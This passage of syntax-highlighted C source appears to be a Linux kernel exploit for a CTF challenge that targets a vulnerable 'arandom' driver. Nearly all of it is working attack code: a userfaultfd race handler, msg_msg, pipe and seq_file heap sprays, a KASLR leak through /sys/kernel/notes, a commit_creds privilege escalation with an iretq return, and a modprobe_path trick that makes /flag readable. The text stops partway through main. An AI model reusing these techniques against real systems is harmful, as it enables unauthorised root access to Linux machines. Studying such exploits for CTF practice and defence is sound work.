class="title">msg</span>;</span></span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">  uffd = (<span class="type">long</span>)arg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 当 poll 返回时说明出现了缺页异常</span></span><br><span class="line"><span class="comment">     * 你可以在这里插入一些比如说 sleep() 一类的操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    success(<span class="string">&quot;enter the fault handler\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">      err_exit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>)page;</span><br><span class="line">    uffdio_copy.dst =</span><br><span class="line">        (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">    uffdio_copy.len = page_size;</span><br><span class="line">    uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">    uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">      err_exit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ETH_P_ALL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETH_P_ALL 0x0003</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">  <span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">  <span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">  <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;setsockopt(PACKET_VERSION)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">  req.tp_block_size = block_size;</span><br><span class="line">  req.tp_frame_size = frame_size;</span><br><span class="line">  req.tp_block_nr = block_nr;</span><br><span class="line">  req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">  req.tp_retire_blk_tov = timeout;</span><br><span class="line">  req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">  req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">  <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;setsockopt(PACKET_RX_RING)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">                        <span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv,</span></span><br><span class="line"><span class="params">                        <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">  <span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">  <span class="keyword">if</span> (s &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;socket(AF_PACKET)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv,</span><br><span class="line">                             timeout);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">  sa.sll_family = PF_PACKET;</span><br><span class="line">  sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">  sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">  sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">  sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">  sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">  <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;bind(AF_PACKET)&quot;</span>), <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> packet_socket_setup(size, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">uint64_t</span> *payload, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d:\t%#lx\n&quot;</span>, i, payload[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">  <span class="type">uint64_t</span> next;</span><br><span class="line">  <span class="type">uint64_t</span> prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">  <span class="type">uint64_t</span> m_type;</span><br><span class="line">  <span class="type">uint64_t</span> m_ts;</span><br><span class="line">  <span class="type">uint64_t</span> next;</span><br><span class="line">  <span class="type">uint64_t</span> security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">  <span class="type">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct msgbuf &#123;</span></span><br><span class="line"><span class="comment">    long mtype;</span></span><br><span class="line"><span class="comment">    char mtext[0];</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_msg_queue</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">  ((<span class="keyword">struct</span> msgbuf *)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">  <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">peek_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp,</span><br><span class="line">                MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">               <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, <span class="type">uint64_t</span> next,</span></span><br><span class="line"><span class="params">               <span class="type">uint64_t</span> security)</span> &#123;</span><br><span class="line">  msg-&gt;m_list.next = m_list_next;</span><br><span class="line">  msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">  msg-&gt;m_type = m_type;</span><br><span class="line">  msg-&gt;m_ts = m_ts;</span><br><span class="line">  msg-&gt;next = next;</span><br><span class="line">  msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stat</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;movq %%cs, %0;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %%ss, %1;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %%rsp, %2;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;pushfq;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;popq %3;&quot;</span></span></span><br><span class="line"><span class="params">               : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_sp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span></span><br><span class="line"><span class="params">               :</span></span><br><span class="line"><span class="params">               : <span class="string">&quot;memory&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">templine</span><span class="params">()</span> &#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">  <span class="keyword">asm</span>(<span class="string">&quot;pushq   %0;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   %1;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   %2;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   %3;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   $shell;&quot;</span></span><br><span class="line">      <span class="string">&quot;pushq   $0;&quot;</span></span><br><span class="line">      <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">      <span class="string">&quot;popq    %%rbp;&quot;</span></span><br><span class="line">      <span class="string">&quot;iretq;&quot;</span> ::<span class="string">&quot;m&quot;</span>(user_ss),</span><br><span class="line">      <span class="string">&quot;m&quot;</span>(user_sp), <span class="string">&quot;m&quot;</span>(user_rflags), <span class="string">&quot;m&quot;</span>(user_cs));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">  <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">  CPU_ZERO(&amp;cpu_set);</span><br><span class="line">  CPU_SET(core, &amp;cpu_set);</span><br><span class="line">  sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">  <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET))</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to create a new namespace&quot;</span>);</span><br><span class="line"></span><br><span class="line">  tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">  write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">  close(tmp_fd);</span><br><span class="line"></span><br><span class="line">  tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">  <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">  write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">  close(tmp_fd);</span><br><span class="line"></span><br><span class="line">  tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">  <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">  write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">  close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __always_inline <span class="title function_">pt_reg</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buffer)</span> &#123;</span><br><span class="line">  __asm__ __volatile__(<span class="string">&quot;movq $0xbeefdead,   %%r15;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x11111111,   %%r14;&quot;</span> <span class="comment">// 0x78</span></span><br><span class="line">                       <span class="string">&quot;movq $0x22222222,   %%r13;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x33333333,   %%r12;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x66666666,   %%r11;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x77777777,   %%r10;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x88888888,    %%r9;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x99999999,    %%r8;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0xaaaaaaaa,   %%rcx;&quot;</span></span><br><span class="line">                       <span class="string">&quot;xorq %%rdi,   %%rdi;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movl %0,   %%edi;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq %1,   %%rsi;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $0x20,   %%rdx;&quot;</span></span><br><span class="line">                       <span class="string">&quot;movq $1,   %%rax;&quot;</span></span><br><span class="line">                       <span class="string">&quot;syscall;&quot;</span> ::<span class="string">&quot;r&quot;</span>(fd),</span><br><span class="line">                       <span class="string">&quot;r&quot;</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * read /sys/kernel/notes for passing kaslr</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">leak_from_notes</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd_leak = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">char</span> leak[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  read(fd_leak, leak, <span class="number">0x100</span>);</span><br><span class="line">  <span class="type">uint64_t</span> base = *(<span class="type">uint64_t</span> *)(&amp;leak[<span class="number">0x9c</span>]) - <span class="number">0x2000</span>;</span><br><span class="line">  success(<span class="string">&quot;leaking address: %#lx&quot;</span>, base);</span><br><span class="line">  <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/chmod 777 /flag&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">  usleep(<span class="number">3000</span>);</span><br><span class="line">  system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  pause();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag2</span><span class="params">()</span> &#123;</span><br><span class="line">  execve(<span class="string">&quot;/tmp/dummy&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="type">int</span> fd_flag = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  read(fd_flag, buf, <span class="number">0x50</span>);</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">0x50</span>);</span><br><span class="line">  pause();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_pipe</span><span class="params">(<span class="type">int</span> flides[<span class="number">2</span>])</span> &#123;</span><br><span class="line">  close(flides[<span class="number">0</span>]);</span><br><span class="line">  close(flides[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__((constructor)) init() &#123;</span><br><span class="line">  bind_cpu(<span class="number">0</span>);</span><br><span class="line">  page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arandom_params</span> // <span class="title">sizeof</span>=</span><span class="number">0xC</span></span><br><span class="line">&#123;                     <span class="comment">// XREF: random_info/r</span></span><br><span class="line">  <span class="type">uint32_t</span> rand_size; <span class="comment">// XREF: arandom_ioctl+BF/r</span></span><br><span class="line">  <span class="type">uint32_t</span> rand_offset;</span><br><span class="line">  <span class="type">uint32_t</span> rand_value;</span><br><span class="line">&#125; AAA;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">adjust_rlimit</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = (200 &lt;&lt; 20);</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_AS, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 32 &lt;&lt; 20;</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_MEMLOCK, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 136 &lt;&lt; 20;</span></span><br><span class="line"><span class="comment">  // setrlimit(RLIMIT_FSIZE, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 1 &lt;&lt; 20;</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_STACK, &amp;rlim);</span></span><br><span class="line"><span class="comment">  rlim.rlim_cur = rlim.rlim_max = 0;</span></span><br><span class="line"><span class="comment">  setrlimit(RLIMIT_CORE, &amp;rlim);</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">// RLIMIT_FILE</span></span><br><span class="line">  rlim.rlim_cur = rlim.rlim_max = <span class="number">14096</span>;</span><br><span class="line">  <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">4096</span>;</span><br><span class="line">    <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">      err_exit(<span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pre_spray</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRE_MSG_NUM 56</span></span><br><span class="line">  <span class="type">int</span> pre_ms_qid[PRE_MSG_NUM];</span><br><span class="line">  <span class="type">char</span> *pre_msg_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">  <span class="type">char</span> *pre_msg_recv = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PRE_MSG_NUM; ++i) &#123;</span><br><span class="line">    pre_ms_qid[i] = get_msg_queue();</span><br><span class="line">    <span class="built_in">memset</span>(pre_msg_buf, (<span class="type">char</span>)i, <span class="number">0x1000</span>);</span><br><span class="line">    check(write_msg(pre_ms_qid[i], pre_msg_buf, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;pre spray msg_msg successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PRE_MSG_NUM - <span class="number">8</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    check(read_msg(pre_ms_qid[i], pre_msg_recv, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;free some objs\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = PRE_MSG_NUM - <span class="number">7</span>; i &lt; PRE_MSG_NUM; ++i) &#123;</span><br><span class="line">    check(read_msg(pre_ms_qid[i], pre_msg_recv, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;free before 8 objs\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipe</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_num = <span class="number">0x100</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_buf_size = page_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *pipe_buf = <span class="built_in">malloc</span>(pipe_buf_size);</span><br><span class="line">  <span class="type">int</span> pipe_fd[pipe_num][<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// anon_pipe_buf_ops</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">    check(pipe(pipe_fd[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, i, pipe_buf_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;find__me&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x1</span>; ++j) &#123;</span><br><span class="line">      check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, pipe_buf_size));</span><br><span class="line">    &#125;</span><br><span class="line">    check(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>));</span><br><span class="line">    check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_seq</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> seq_file_num = <span class="number">0xc00</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> seq_fd[seq_file_num];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; seq_file_num; ++i) &#123;</span><br><span class="line">    seq_fd[i] = check(open(<span class="string">&quot;/proc/self/stat&quot;</span>, <span class="number">0</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray seq_op successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1003</span>)); <span class="comment">// write</span></span><br><span class="line">  info(<span class="string">&quot;write buffer+%#x &lt;- %#x\n&quot;</span>, AAA.rand_offset, AAA.rand_value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> Linux v6.11 add msg_msg-xx kmalloc cache and only affects the first</span></span><br><span class="line"><span class="comment">// page, which means we can&#x27;t use it to perform heap spray :(</span></span><br><span class="line"><span class="comment">// Pwned :)</span></span><br><span class="line"><span class="comment">// Success rate: approximately 1/40</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// ioctl: 0x1001: alloc 0x1002: free</span></span><br><span class="line">  <span class="comment">// 0x1003:</span></span><br><span class="line">  <span class="comment">// *(_DWORD *)((char *)buffer + rand_offset) = AAA.rand_value;</span></span><br><span class="line">  <span class="comment">// 0x1004:</span></span><br><span class="line">  <span class="comment">// copy_to_user AAA</span></span><br><span class="line">  <span class="comment">// 0x1005:</span></span><br><span class="line">  <span class="comment">// if ( *(_QWORD *)((char *)buffer + v4) == AAA.rand_value</span></span><br><span class="line">  <span class="comment">//&amp;&amp; v4 == *(_QWORD *)((char *)buffer + v4 + 16)</span></span><br><span class="line">  <span class="comment">//&amp;&amp; *(_QWORD *)((char *)buffer + v4 + 24) == AAA.rand_size )</span></span><br><span class="line">  <span class="comment">//&#123;</span></span><br><span class="line">  <span 